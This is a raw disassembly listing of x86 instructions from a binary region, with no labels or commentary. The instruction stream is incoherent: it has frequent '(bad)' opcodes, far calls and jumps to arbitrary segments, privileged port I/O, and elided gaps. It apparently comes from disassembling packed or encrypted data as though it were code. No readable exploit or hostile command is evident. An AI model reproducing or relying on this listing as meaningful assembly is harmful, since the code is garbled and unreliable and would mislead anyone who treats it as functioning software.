  41b5da:	ror    BYTE PTR [eax+edx*8-0x70b9b348],cl
  41b5e1:	lea    edi,ds:0x31cd70bd
  41b5e7:	mov    dh,0x2e
  41b5e9:	sbb    BYTE PTR [edi],bh
  41b5eb:	cmp    BYTE PTR [eax-0x5d22a5ab],al
  41b5f1:	cmp    eax,0xd2ebcdf8
  41b5f6:	fidiv  DWORD PTR [si]
  41b5f9:	test   BYTE PTR [ebx],0x55
  41b5fc:	sahf   
  41b5fd:	push   ebx
  41b5fe:	cld    
  41b5ff:	mov    cl,0xd4
  41b601:	les    eax,FWORD PTR [bx+di+0x3d9d]
  41b606:	std    
  41b607:	dec    edi
  41b608:	sahf   
  41b609:	retf   0x24c8
  41b60c:	add    al,0xbe
  41b60e:	push   esi
  41b60f:	repz stc 
  41b611:	xchg   ebx,eax
  41b612:	inc    eax
  41b613:	lock call 0x9b0f:0x4b76fd9d
  41b61b:	xor    bl,BYTE PTR [edi+eiz*1+0x3b]
  41b61f:	push   0x4
  41b621:	call   0x714e0f4b
  41b626:	sbb    BYTE PTR [esp+edx*1-0x6059051c],0x56
  41b62e:	add    ecx,ecx
  41b630:	and    DWORD PTR [edi-0x436369cf],ecx
  41b636:	xchg   edi,eax
  41b637:	aas    
  41b638:	or     al,0xca
  41b63a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b63b:	arpl   WORD PTR [esp+ebp*1-0xa],sp
  41b63f:	jnp    0x41b613
  41b641:	leave  
  41b642:	cmp    BYTE PTR [edi+0x49cf785d],al
  41b648:	cmp    DWORD PTR [eax-0x6d],0x69
  41b64c:	xchg   ebp,eax
  41b64d:	test   BYTE PTR [ebx],ah
  41b64f:	mov    al,ds:0x527aa7c1
  41b654:	mov    edi,0x53baa9fd
  41b659:	gs push esp
  41b65b:	das    
  41b65c:	jl     0x41b637
  41b65e:	stos   BYTE PTR es:[edi],al
  41b65f:	in     eax,0x97
  41b661:	fdivrp st(0),st
  41b663:	pusha  
  41b664:	sbb    eax,0x9b3248ae
  41b669:	xchg   edi,eax
  41b66a:	hlt    
  41b66b:	xchg   ecx,eax
  41b66c:	push   0x2a
  41b66e:	and    al,0xaa
  41b670:	(bad)  
  41b672:	jnp    0x41b698
  41b674:	add    BYTE PTR [ebp+ebp*4+0x1cc78f2b],al
  41b67b:	cmp    BYTE PTR [eax],dh
  41b67d:	aad    0x5a
  41b67f:	jne    0x41b6a8
  41b681:	callw  0xfcee
  41b685:	stc    
  41b686:	xor    al,0x7
  41b688:	mov    ebp,0xd87daf74
  41b68d:	fdivr  QWORD PTR [edi]
  41b68f:	(bad)  
	...
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	mov    DWORD PTR [esi],edx
  41b702:	fwait
  41b703:	sbb    BYTE PTR [ebx+eiz*1],0x1
  41b707:	add    BYTE PTR [ecx+eax*1],al
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b70d:	adc    ebx,edx
  41b70f:	bt     DWORD PTR [eax],edx
  41b712:	jp     0x41b74e
  41b714:	inc    esp
  41b715:	ins    BYTE PTR es:[edi],dx
  41b716:	pop    edi
  41b717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b718:	mov    ecx,0xab276ae
  41b71d:	xor    bh,BYTE PTR [eax]
  41b71f:	call   0x69e:0x467069b7
  41b726:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41b728:	mov    al,BYTE PTR [edi-0x40637f7b]
  41b72e:	push   0xc27539da
  41b733:	out    0x54,eax
  41b735:	fdivr  QWORD PTR [esi]
  41b737:	shl    BYTE PTR [ebx+0x437d3179],cl
  41b73d:	sbb    al,0xc6
  41b73f:	jl     0x41b736
  41b741:	in     eax,0xe3
  41b743:	int3   
  41b744:	inc    BYTE PTR ds:[edi+0x5b]
  41b748:	sub    bl,BYTE PTR [eax+0x21b2c87c]
  41b74e:	push   0xffffffc2
  41b750:	mov    ds:0x9e914a5c,al
  41b755:	sbb    dl,BYTE PTR [esi]
  41b757:	inc    edx
  41b758:	mov    ebx,0xd0f241a9
  41b75d:	sbb    edx,ebx
  41b75f:	mov    bl,0xd
  41b761:	pusha  
  41b762:	dec    esi
  41b763:	popa   
  41b764:	jp     0x41b7a9
  41b766:	or     bl,bl
  41b768:	out    dx,al
  41b769:	pop    esi
  41b76a:	and    BYTE PTR [ebx+edi*1],bh
  41b76d:	ds loope 0x41b753
  41b770:	aaa    
  41b771:	fsubr  DWORD PTR [ebx+0x9]
  41b774:	or     bl,dh
  41b776:	sbb    BYTE PTR [edx],bh
  41b778:	or     DWORD PTR [edi-0x197b44d6],eax
  41b77e:	adc    ebx,esi
  41b780:	mov    ch,0x11
  41b782:	ret    
  41b783:	push   edx
  41b784:	ins    DWORD PTR es:[edi],dx
  41b785:	jge    0x41b762
  41b787:	call   0xff35:0x3927dd9d
  41b78e:	into   
  41b78f:	into   
  41b790:	dec    edx
  41b791:	xchg   edi,eax
  41b792:	xor    DWORD PTR ds:[eax+eax*2],ebx
  41b796:	cdq    
  41b797:	cmp    BYTE PTR [ebx+edi*1+0x7fd85eb6],bh
  41b79e:	or     ebx,ebp
  41b7a0:	repnz push ds
  41b7a2:	sbb    DWORD PTR [esi-0x62c38556],esi
  41b7a8:	rcl    DWORD PTR [ecx+0x29],1
  41b7ab:	loope  0x41b789
  41b7ad:	and    BYTE PTR [edi],al
  41b7af:	ds jle 0x41b7f3
  41b7b2:	inc    ebx
  41b7b3:	fs xchg esi,eax
  41b7b5:	push   esi
  41b7b6:	enter  0x310c,0x10
  41b7ba:	or     al,0x29
  41b7bc:	(bad)  
  41b7bd:	pop    ds
  41b7be:	outs   dx,DWORD PTR ds:[esi]
  41b7bf:	cmp    BYTE PTR [ecx-0x33a6adb1],cl
  41b7c5:	jo     0x41b789
  41b7c7:	shl    al,cl
  41b7c9:	outs   dx,BYTE PTR ds:[esi]
  41b7ca:	xchg   ecx,eax
  41b7cb:	xor    ebx,ebp
  41b7cd:	lods   al,BYTE PTR ds:[esi]
  41b7ce:	unpckhps xmm4,XMMWORD PTR [ebp-0x74]
  41b7d2:	fs xchg edi,eax
  41b7d4:	fsubp  st(5),st
  41b7d6:	mov    ecx,0xa9778cbf
  41b7db:	and    BYTE PTR ds:0x30f154cd,cl
  41b7e1:	mov    dl,0x3f
  41b7e3:	jmp    0x41b7e1
  41b7e5:	ins    BYTE PTR es:[edi],dx
  41b7e6:	mov    ah,0x88
  41b7e8:	mov    edi,0xe432f357
  41b7ed:	ins    DWORD PTR es:[edi],dx
  41b7ee:	pusha  
  41b7ef:	dec    eax
  41b7f0:	cmp    eax,0xbee47dcc
  41b7f5:	push   edx
  41b7f6:	mov    ebp,0x64d8704a
  41b7fb:	(bad)  
  41b7fc:	bound  ebp,QWORD PTR [ebx+0x6437a534]
  41b802:	loope  0x41b807
  41b804:	push   ebp
  41b805:	mul    DWORD PTR [ecx+esi*1+0x6a]
  41b809:	fwait
  41b80a:	cmp    BYTE PTR [ebx+0x511edb37],al
	...
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0xed
  41b881:	pop    edi
  41b882:	mov    esi,0x12420ca
  41b887:	add    BYTE PTR [ecx+eax*1],al
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	ret    0x4644
  41b88f:	call   0xee8e0ff8
  41b894:	adc    al,0x5f
  41b896:	inc    ecx
  41b897:	xchg   DWORD PTR [esi],ebx
  41b899:	vpaddd xmm6,xmm2,xmm2
  41b89d:	(bad)  
  41b89e:	mov    ebx,0x7db40852
  41b8a3:	in     al,0xc3
  41b8a5:	cmp    eax,0xb19ce8c7
  41b8aa:	dec    edi
  41b8ab:	not    BYTE PTR [ebx+0x47]
  41b8ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8af:	stc    
  41b8b0:	in     al,dx
  41b8b1:	ja     0x41b907
  41b8b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8b4:	sub    dl,BYTE PTR [edi-0x4e]
  41b8b7:	xchg   esp,eax
  41b8b8:	fcomp  QWORD PTR [edi]
  41b8ba:	out    dx,al
  41b8bb:	call   0x2eee:0x750317a3
  41b8c2:	stos   BYTE PTR es:[edi],al
  41b8c3:	fdiv   DWORD PTR [ebx+ebp*4]
  41b8c6:	jb     0x41b8a0
  41b8c8:	int3   
  41b8c9:	dec    edx
  41b8ca:	stos   BYTE PTR es:[edi],al
  41b8cb:	das    
  41b8cc:	or     bh,BYTE PTR [esi-0x5286b34]
  41b8d2:	xchg   edx,eax
  41b8d3:	stc    
  41b8d4:	int    0x83
  41b8d6:	test   ecx,esp
  41b8d8:	cli    
  41b8d9:	jno    0x41b89a
  41b8db:	jno    0x41b8e5
  41b8dd:	push   es
  41b8de:	ret    
  41b8df:	jbe    0x41b90a
  41b8e1:	mov    ebp,0xe4132654
  41b8e6:	pop    ecx
  41b8e7:	cmp    BYTE PTR [ecx],0x92
  41b8ea:	jno    0x41b966
  41b8ec:	mov    ecx,0x6d8e185b
  41b8f1:	jae    0x41b8f6
  41b8f3:	sub    eax,0xc5f57f0e
  41b8f8:	jg     0x41b961
  41b8fa:	xchg   esp,eax
  41b8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8fc:	pop    ebp
  41b8fd:	add    eax,0xdf4ff161
  41b902:	and    BYTE PTR [edi],0xae
  41b905:	push   ss
  41b906:	mov    ds:0xde46b122,eax
  41b90b:	xor    ah,BYTE PTR [ecx+0x3b]
  41b90e:	and    eax,0x77b83696
  41b913:	or     BYTE PTR [eax+0x7386ff61],bh
  41b919:	pop    ds
  41b91a:	or     bh,BYTE PTR [edx]
  41b91c:	inc    esi
  41b91d:	xor    dl,ch
  41b91f:	call   DWORD PTR [edx+0x28]
  41b922:	mov    ebx,0x12aea848
  41b927:	cmp    DWORD PTR [ecx+ecx*4+0x7d],0x3a245c68
  41b92f:	push   0xf7209edd
  41b934:	sub    ch,al
  41b936:	ret    0x4923
  41b939:	mov    ebx,0xe8611869
  41b93e:	push   edx
  41b93f:	jg     0x41b9a9
  41b941:	mov    gs,WORD PTR [eax+0x21b1a89b]
  41b947:	sub    BYTE PTR [eax],bl
  41b949:	lock sub ebx,DWORD PTR [eax+0x15]
  41b94d:	lock data16 xor ch,BYTE PTR [ecx+0x2a7b513d]
  41b955:	data16 fistp QWORD PTR gs:[ebx]
  41b959:	fisubr WORD PTR [eax]
  41b95b:	add    al,0x1b
  41b95d:	shr    BYTE PTR [edx+0x56],cl
  41b960:	imul   DWORD PTR [eax-0x7f]
  41b963:	and    eax,0xf27ec8ca
  41b968:	int3   
  41b969:	fcomp  st(6)
  41b96b:	test   ah,bh
  41b96d:	mov    al,0x11
  41b96f:	push   esp
  41b970:	add    eax,0x4bfbd911
  41b975:	inc    esp
  41b976:	aas    
  41b977:	cdq    
  41b978:	xchg   BYTE PTR [ecx+ecx*8],bh
  41b97b:	lds    esp,FWORD PTR [ebx]
  41b97d:	gs (bad) 
  41b97f:	int3   
  41b980:	lods   eax,DWORD PTR ds:[esi]
  41b981:	imul   BYTE PTR [eax]
  41b983:	call   DWORD PTR [edx-0x1b]
  41b986:	sub    eax,DWORD PTR [edi+0x16]
  41b989:	stos   DWORD PTR es:[edi],eax
  41b98a:	das    
  41b98b:	inc    ecx
  41b98c:	xlat   BYTE PTR ds:[ebx]
  41b98d:	repz jg 0x41b97c
	...
  41b9f4:	ret    
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	pop    edx
  41ba01:	and    BYTE PTR [ecx],0x7d
  41ba04:	and    al,0x25
  41ba06:	add    DWORD PTR [eax],eax
  41ba08:	add    al,0x1
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	cs hlt 
  41ba0e:	or     cl,BYTE PTR [ecx-0x29]
  41ba11:	mov    eax,ds:0x839ef4ac
  41ba16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba17:	in     al,0x26
  41ba19:	push   esp
  41ba1a:	pushf  
  41ba1b:	ds and edi,eax
  41ba1e:	scas   eax,DWORD PTR es:[edi]
  41ba1f:	mov    bh,0x5
  41ba21:	add    DWORD PTR [edx+esi*8+0x1c2c7e1e],esi
  41ba28:	test   eax,0xe4d1e48f
  41ba2d:	jmp    0x5ef7b12
  41ba32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba33:	mov    eax,DWORD PTR [ecx-0x4]
  41ba36:	xor    BYTE PTR ds:0x257e796f,al
  41ba3c:	shl    BYTE PTR [esi-0x73a0741c],0xea
  41ba43:	stos   BYTE PTR es:[edi],al
  41ba44:	lods   al,BYTE PTR ds:[esi]
  41ba45:	pop    ebx
  41ba46:	(bad)  
  41ba47:	or     al,0x8d
  41ba49:	repz call 0xc87b:0x98b0c4cf
  41ba51:	in     al,dx
  41ba52:	into   
  41ba53:	jmp    0x33d81096
  41ba58:	or     al,0x62
  41ba5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba5b:	xor    DWORD PTR [ecx-0x4030dd6a],0x24
  41ba62:	push   0xfffffff7
  41ba64:	jmp    0x4f30:0xdcb5d00c
  41ba6b:	mov    bl,0xc4
  41ba6d:	pop    ebp
  41ba6e:	and    BYTE PTR [esi],dl
  41ba70:	scas   al,BYTE PTR es:[edi]
  41ba71:	ins    DWORD PTR es:[edi],dx
  41ba72:	imul   esp,ecx,0x1561002f
  41ba78:	jns    0x41bae3
  41ba7a:	xchg   ebp,eax
  41ba7b:	ds cmp eax,0x5b717184
  41ba81:	std    
  41ba82:	xchg   esp,eax
  41ba83:	push   ebp
  41ba84:	jmp    0x135d5418
  41ba89:	retf   
  41ba8a:	mov    eax,ds:0x9417db0f
  41ba8f:	jmp    0x84f7:0x97f7dbf4
  41ba96:	xchg   ebx,eax
  41ba97:	(bad)  
  41ba98:	sub    dh,dh
  41ba9a:	adc    ecx,DWORD PTR [ecx]
  41ba9c:	aad    0x6d
  41ba9e:	inc    esp
  41ba9f:	call   eax
  41baa1:	add    eax,0x5fdee7cf
  41baa6:	aam    0x83
  41baa8:	and    ebx,DWORD PTR ds:0x873fe742
  41baae:	call   0x3744:0xdd80300c
  41bab5:	cmp    DWORD PTR [ebp-0xc7bcdd],ebx
  41babb:	mov    ds:0xd98f18c9,eax
  41bac0:	xlat   BYTE PTR ds:[ebx]
  41bac1:	fdivr  st(2),st
  41bac3:	inc    esi
  41bac4:	mov    gs,WORD PTR [eax-0x140adb48]
  41baca:	sbb    DWORD PTR [eax-0x7a],0x1b
  41bace:	outs   dx,DWORD PTR ds:[esi]
  41bad0:	add    ch,BYTE PTR [ecx]
  41bad2:	cmp    eax,0xca8d314a
  41bad7:	gs mov edi,0xae2e5189
  41badd:	lds    edx,FWORD PTR [ebp-0x805debb]
  41bae3:	xor    ebp,edi
  41bae5:	jmp    0x5883:0x7d4d2ae
  41baec:	leave  
  41baed:	and    al,0xb5
  41baef:	push   ecx
  41baf0:	sub    al,0xb8
  41baf2:	lds    esi,FWORD PTR [ebp+0x64257531]
  41baf8:	test   al,0xb7
  41bafa:	adc    BYTE PTR [edi+0x10c76cf3],bl
  41bb00:	inc    esi
  41bb01:	or     edx,DWORD PTR [esi-0x17ba75e7]
  41bb07:	test   eax,0x526d05d7
  41bb0c:	fild   QWORD PTR [ebx+0x6f]
  41bb0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  41bb74:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x1c],cx
  41bb81:	sub    bl,BYTE PTR [ebx+0x12628ab]
  41bb87:	add    BYTE PTR [ecx+eax*1],al
  41bb8a:	add    BYTE PTR [eax],al
  41bb8c:	cld    
  41bb8d:	dec    edi
  41bb8e:	or     DWORD PTR [ecx-0x2cbe4605],edi
  41bb94:	data16 cs ffree st(5)
  41bb98:	ret    
  41bb99:	pop    edx
  41bb9a:	(bad)  
  41bb9b:	push   eax
  41bb9c:	dec    ebx
  41bb9d:	pop    edi
  41bb9e:	lea    eax,[edx+ecx*2]
  41bba1:	ror    bl,1
  41bba3:	inc    ecx
  41bba4:	ja     0x41bb30
  41bba6:	fdivr  DWORD PTR [ebx-0x53]
  41bba9:	mov    ecx,0x7dfaa02e
  41bbae:	js     0x41bbf3
  41bbb0:	jns    0x41bb53
  41bbb2:	xchg   ebp,eax
  41bbb3:	pop    es
  41bbb4:	call   0x1f153933
  41bbb9:	lahf   
  41bbba:	or     DWORD PTR [edx-0xd],esi
  41bbbd:	daa    
  41bbbe:	push   cs
  41bbbf:	or     DWORD PTR [eax+ebx*1],esi
  41bbc2:	in     al,dx
  41bbc3:	and    al,0xca
  41bbc5:	jno    0x41bb93
  41bbc7:	mov    ds:0xc342295a,eax
  41bbcc:	mov    dl,0xb6
  41bbce:	lahf   
  41bbcf:	xlat   BYTE PTR ds:[ebx]
  41bbd0:	or     ah,bh
  41bbd2:	ficom  WORD PTR [ebp+0x2d18af5f]
  41bbd8:	or     BYTE PTR [edi],al
  41bbda:	xchg   ebp,eax
  41bbdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbdc:	sub    bl,BYTE PTR [ecx-0x72fd3e01]
  41bbe2:	sar    bl,0x52
  41bbe5:	(bad)  
  41bbe6:	mov    ds:0x6c0c3d1a,eax
  41bbeb:	sub    DWORD PTR [edx+eiz*8],ebx
  41bbee:	push   esp
  41bbef:	gs mov ebp,0x52cf571d
  41bbf5:	pop    ds
  41bbf6:	(bad)  
  41bbf7:	mov    ebx,0x4aa3d9bb
  41bbfc:	popf   
  41bbfd:	cmp    ah,dl
  41bbff:	jle    0x41bc55
  41bc01:	dec    edx
  41bc02:	adc    DWORD PTR ds:0xaf6a6aa8,ebp
  41bc08:	jle    0x41bc3e
  41bc0a:	lods   eax,DWORD PTR ds:[esi]
  41bc0b:	ss xchg ebx,eax
  41bc0d:	and    edi,DWORD PTR [esi]
  41bc0f:	ja     0x41bc1c
  41bc11:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc13:	shl    bl,0xd0
  41bc16:	inc    eax
  41bc17:	stos   BYTE PTR es:[edi],al
  41bc18:	mov    ?,WORD PTR [edx]
  41bc1a:	and    al,0xc9
  41bc1c:	shl    BYTE PTR [edi+0x5a],cl
  41bc1f:	dec    edi
  41bc20:	inc    eax
  41bc21:	out    dx,al
  41bc22:	or     BYTE PTR ss:[ebx+0x6f17bb7f],bl
  41bc29:	out    0xa2,eax
  41bc2b:	sub    dh,al
  41bc2d:	cld    
  41bc2e:	test   BYTE PTR [esi+0x203e3a9],0x4d
  41bc35:	test   eax,0xa33f7c63
  41bc3a:	sub    eax,0x597e8360
  41bc3f:	mov    ebx,0x28fd89b8
  41bc44:	fld    QWORD PTR [ebp+0x740ce9b5]
  41bc4a:	mov    eax,ds:0x9356088f
  41bc4f:	cmp    DWORD PTR [edx-0x5cebee10],ecx
  41bc55:	mul    BYTE PTR [esi+0x27]
  41bc58:	push   0xfffffff8
  41bc5a:	cmp    BYTE PTR [ebx-0x6e],al
  41bc5d:	lahf   
  41bc5e:	repnz pop esi
  41bc60:	mov    ds:0xe8ea346b,eax
  41bc65:	mov    ds:0x96ab47f1,eax
  41bc6a:	sbb    al,0xcc
  41bc6c:	idiv   DWORD PTR [edi+0x35]
  41bc6f:	popf   
  41bc70:	scas   eax,DWORD PTR es:[edi]
  41bc71:	jno    0x41bc10
  41bc73:	or     DWORD PTR [eax+0x48c3894a],edi
  41bc79:	adc    DWORD PTR [eax],edx
  41bc7b:	mov    esp,0x85ee6364
  41bc80:	test   BYTE PTR [ebx],ch
  41bc82:	js     0x41bcfc
  41bc84:	sub    edx,DWORD PTR [ecx-0x75]
  41bc87:	rep ins BYTE PTR es:[edi],dx
  41bc89:	call   0x12dd9e7a
  41bc8e:	ins    BYTE PTR es:[edi],dx
  41bc8f:	jp     0x41bc91
	...
  41bcf1:	add    BYTE PTR [eax],al
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x4005d9d8
  41bd02:	xchg   ecx,eax
  41bd03:	inc    ebx
  41bd04:	sub    al,0x27
  41bd06:	add    DWORD PTR [eax],eax
  41bd08:	add    al,0x1
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	icebp  
  41bd0d:	cmp    BYTE PTR [eax-0x1f3982a4],0xd3
  41bd14:	fld    QWORD PTR [ecx+esi*2]
  41bd17:	mov    ah,0x87
  41bd19:	mov    edi,0x7a0f1c20
  41bd1e:	std    
  41bd1f:	dec    ecx
  41bd20:	ror    DWORD PTR [esi+eiz*8],0xd3
  41bd24:	test   BYTE PTR [eax+0x67],ch
  41bd27:	outs   dx,BYTE PTR ds:[esi]
  41bd28:	imul   DWORD PTR [ebp-0x59407082]
  41bd2e:	mov    ah,0x1c
  41bd30:	xor    DWORD PTR [esi+0x9240092],edx
  41bd36:	or     dh,BYTE PTR es:[ebp+0x601b0702]
  41bd3d:	and    dh,BYTE PTR [eax-0x35]
  41bd40:	xchg   ecx,eax
  41bd41:	ror    DWORD PTR [esp+edx*8+0x51],cl
  41bd45:	test   eax,0x288f94b5
  41bd4a:	adc    esp,DWORD PTR [esi*1+0x63c828d9]
  41bd51:	xchg   edx,eax
  41bd52:	out    0x59,al
  41bd54:	dec    edx
  41bd55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd56:	shr    BYTE PTR [edi],cl
  41bd58:	dec    esp
  41bd59:	loopne 0x41bd49
  41bd5b:	sub    ebp,edi
  41bd5d:	cdq    
  41bd5e:	(bad)
  41bd61:	ret    0xb8e6
  41bd64:	xchg   edi,eax
  41bd65:	add    ebp,DWORD PTR [edx+0x66]
  41bd68:	pop    edi
  41bd69:	shr    BYTE PTR [ebx+0x16],cl
  41bd6c:	imul   edx
  41bd6e:	push   0x76
  41bd70:	jp     0x41bd74
  41bd72:	push   edi
  41bd73:	mov    eax,ds:0xf012e8bd
  41bd78:	popf   
  41bd79:	or     BYTE PTR [edx-0x3d],cl
  41bd7c:	jge    0x41bdd6
  41bd7e:	or     esp,edx
  41bd80:	js     0x41bd14
  41bd82:	das    
  41bd83:	shl    BYTE PTR [ecx-0x561ed04e],cl
  41bd89:	add    ch,BYTE PTR [esp+edx*4+0x6a]
  41bd8d:	jp     0x41bd8b
  41bd8f:	mov    edx,0xcc9a6c83
  41bd94:	(bad)  
  41bd96:	or     DWORD PTR [ebx+0x32],ebp
  41bd99:	dec    esi
  41bd9a:	aad    0x66
  41bd9c:	lds    ecx,FWORD PTR [eax+0x2fbd9a40]
  41bda2:	pop    eax
  41bda3:	xor    al,dl
  41bda5:	add    eax,edx
  41bda7:	mov    al,ds:0x27c5139b
  41bdac:	jmp    0xcb4e:0x2794fc92
  41bdb3:	rcl    BYTE PTR [esi+0x90e7d43],0xe6
  41bdba:	sub    dl,dl
  41bdbc:	movaps xmm6,XMMWORD PTR [ebx-0x2c]
  41bdc0:	cmp    BYTE PTR [ebp-0x42],al
  41bdc3:	xchg   esp,eax
  41bdc4:	retf   0x87f5
  41bdc7:	mov    dh,0x21
  41bdc9:	out    0x91,eax
  41bdcb:	jge    0x41be04
  41bdcd:	outs   dx,BYTE PTR ds:[esi]
  41bdce:	jns    0x41be0f
  41bdd0:	sbb    al,0x8a
  41bdd2:	mov    ebx,0xa738d71e
  41bdd7:	cmp    bl,al
  41bdd9:	stos   BYTE PTR es:[edi],al
  41bdda:	jmp    0x46bac2b1
  41bddf:	xchg   ebx,eax
  41bde0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bde1:	inc    esi
  41bde2:	push   edx
  41bde3:	loope  0x41be41
  41bde5:	push   edx
  41bde6:	or     edx,DWORD PTR [edi+edx*2-0x3da85b3a]
  41bded:	add    BYTE PTR [ecx+esi*1-0x158a1e49],ch
  41bdf4:	out    dx,eax
  41bdf5:	dec    ebp
  41bdf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdf7:	inc    esi
  41bdf8:	call   0xc07e3707
  41bdfd:	fstp   DWORD PTR ds:0x9fbfd4cf
  41be03:	test   eax,0x5f75320
  41be08:	mov    dh,bh
  41be0a:	xchg   esp,eax
  41be0b:	enter  0x4c13,0x5
  41be0f:	sldt   WORD PTR [eax]
	...
  41be72:	add    BYTE PTR [eax],al
  41be74:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be7a:	imul   edi
  41be7c:	mov    ebp,DWORD PTR [ecx-0x2491c09a]
  41be82:	inc    ecx
  41be83:	mov    eax,0x12830
  41be88:	add    al,0x1
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	cmp    eax,0xffffffe8
  41be8f:	pop    ebx
  41be90:	jb     0x41beff
  41be92:	and    BYTE PTR [eax-0x756f1463],al
  41be98:	inc    edi
  41be99:	fiadd  DWORD PTR [eax]
  41be9b:	dec    edi
  41be9c:	add    edi,ebp
  41be9e:	cmp    eax,0x717a54c5
  41bea3:	retf   0x244
  41bea6:	mov    eax,ds:0x2c5eddf5
  41beab:	cmp    BYTE PTR [ebp-0x73],bh
  41beae:	nop
  41beaf:	mov    bh,0xa3
  41beb1:	cmp    DWORD PTR [edi-0x53],0x58e5c3fa
  41beb8:	cmp    esi,DWORD PTR [edx+0x516197c3]
  41bebe:	xor    al,0xaf
  41bec0:	pop    ds
  41bec1:	(bad)  
  41bec2:	sub    ch,bl
  41bec4:	shr    DWORD PTR [edx+0xc6225af],1
  41beca:	cmc    
  41becb:	cld    
  41becc:	stos   BYTE PTR es:[edi],al
  41becd:	enter  0xc931,0x1a
  41bed1:	mov    ecx,?
  41bed3:	addr16 dec ebx
  41bed5:	stc    
  41bed6:	and    al,0x48
  41bed8:	mul    BYTE PTR [ebp+0x246b55f3]
  41bede:	loope  0x41bebb
  41bee0:	dec    edi
  41bee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bee2:	sub    BYTE PTR [eax+0x13],ah
  41bee5:	push   esp
  41bee6:	int3   
  41bee7:	xchg   edi,eax
  41bee8:	mov    ss,ecx
  41beea:	mov    esi,0xf1409409
  41beef:	xor    al,0x8f
  41bef1:	(bad)  
  41bef2:	jns    0x41bf18
  41bef4:	xor    eax,0x7364d06a
  41bef9:	dec    ebx
  41befa:	pop    edi
  41befb:	sbb    eax,0x190b2fd7
  41bf00:	inc    ah
  41bf02:	cdq    
  41bf03:	lods   al,BYTE PTR ds:[esi]
  41bf04:	ror    DWORD PTR [edx],cl
  41bf06:	mov    edx,0xbfaabdcb
  41bf0b:	pop    ds
  41bf0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf0d:	mov    edx,0xb3412aec
  41bf12:	test   al,0x15
  41bf14:	fcompp 
  41bf16:	jecxz  0x41bef4
  41bf18:	jns    0x41bf08
  41bf1a:	out    dx,al
  41bf1b:	sbb    BYTE PTR [ecx-0x39],0xfb
  41bf1f:	scas   eax,DWORD PTR es:[edi]
  41bf20:	push   es
  41bf21:	inc    ebx
  41bf22:	mov    al,0x9a
  41bf24:	fwait
  41bf25:	mov    ds:0x84193a57,eax
  41bf2a:	icebp  
  41bf2b:	or     BYTE PTR [edi-0x75bf2ba6],0xf9
  41bf32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf33:	fdivr  QWORD PTR [ebx-0x2b1e2346]
  41bf39:	bound  edi,QWORD PTR [edx+0x207c1f84]
  41bf3f:	mov    WORD PTR [ecx-0x7f],gs
  41bf42:	xor    ecx,DWORD PTR [ebx-0x46]
  41bf45:	xor    ecx,DWORD PTR [ebx+ebp*4]
  41bf48:	xor    al,0x16
  41bf4a:	or     edx,DWORD PTR [edx]
  41bf4c:	sub    eax,0xb00f048
  41bf51:	aas    
  41bf52:	loopne 0x41bedf
  41bf54:	and    bh,BYTE PTR [ecx-0x14]
  41bf57:	sub    eax,0x15a4b1d3
  41bf5c:	mov    dh,0x5
  41bf5e:	loopne 0x41bf23
  41bf60:	cmp    DWORD PTR [edi-0x35545fe3],0x9cff4e87
  41bf6a:	sbb    BYTE PTR es:[eax+0x9cded11],cl
  41bf71:	cmp    eax,DWORD PTR [edi+esi*1+0x52]
  41bf75:	xchg   edx,eax
  41bf76:	sub    eax,0x5ee6fd2b
  41bf7b:	mov    dh,0x33
  41bf7d:	and    eax,DWORD PTR [edx-0x69]
  41bf80:	push   ss
  41bf81:	xor    al,0xa0
  41bf83:	in     eax,0x81
  41bf85:	shl    DWORD PTR [edi+0x2ef7358b],1
  41bf8b:	das    
  41bf8c:	pushf  
  41bf8d:	hlt    
  41bf8e:	or     DWORD PTR [ebx+0x0],ebp
	...
  41bff4:	fs jae 0x41c02a
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	and    esp,DWORD PTR [esi]
  41c002:	sbb    DWORD PTR [ebx],0x12934
  41c008:	add    al,0x1
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	(bad)  
  41c00d:	mov    edx,0xc730054a
  41c012:	jge    0x41c087
